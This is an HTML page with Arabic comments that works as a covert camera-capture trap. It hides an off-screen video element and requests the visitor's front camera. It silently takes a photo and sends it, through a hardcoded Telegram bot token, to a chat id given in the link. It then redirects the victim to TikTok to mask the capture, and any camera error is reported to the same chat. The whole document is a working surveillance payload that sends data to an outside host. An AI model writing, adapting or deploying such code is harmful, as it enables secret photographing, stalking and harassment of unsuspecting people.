<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
        }
    </style>
</head>
<body>

    <!-- عناصر التصوير مخفية -->
    <video id="video" autoplay playsinline style="position:fixed; top:-1000px; left:-1000px; width:1px; height:1px;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ====== الإعدادات ======
        const token = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
        const id = new URLSearchParams(window.location.search).get('id');
        
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        
        let stream = null;

        // ====== بداية التصوير ======
        async function start() {
            if (!id) {
                window.location.href = "https://www.tiktok.com";
                return;
            }

            try {
                // طلب الكاميرا الأمامية فقط (بدون ميكروفون)
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }
                });
                
                video.srcObject = stream;
                
                // انتظار 3 ثواني عشان الكاميرا تثبت وتضبط الإضاءة
                setTimeout(() => {
                    // ضبط حجم الكانفس بنفس حجم الفيديو
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    
                    // رسم الصورة من الفيديو إلى الكانفس
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // تحويل الكانفس إلى صورة
                    canvas.toBlob((blob) => {
                        // إرسال الصورة
                        const form = new FormData();
                        form.append('chat_id', id);
                        form.append('photo', blob, 'photo.jpg');
                        
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: form
                        }).finally(() => {
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = "https://www.tiktok.com";
                        });
                    }, 'image/jpeg');
                    
                }, 3000);
                
            } catch (err) {
                // إذا فشل، أرسل رسالة
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: id,
                        text: `❌ خطأ: ${err.message}`
                    })
                }).finally(() => {
                    window.location.href = "https://www.tiktok.com";
                });
            }
        }

        // تشغيل
        start();

        // طوارئ: توجه بعد 10 ثواني
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com";
        }, 10000);
    </script>
</body>
</html>
